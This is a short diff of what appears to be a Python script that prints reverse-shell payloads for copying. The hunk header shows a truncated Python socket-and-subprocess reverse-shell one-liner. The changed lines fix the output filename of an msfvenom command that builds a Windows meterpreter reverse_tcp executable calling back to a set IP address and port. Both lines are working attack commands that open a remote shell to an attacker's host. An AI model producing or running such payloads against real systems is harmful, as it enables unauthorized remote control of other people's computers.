@@ -75,5 +75,5 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ''')
 
 print('''----metasploit----
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.25.187 LPORT=1234 -f exe > p.ex
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.25.187 LPORT=1234 -f exe > p.exe
 ''')
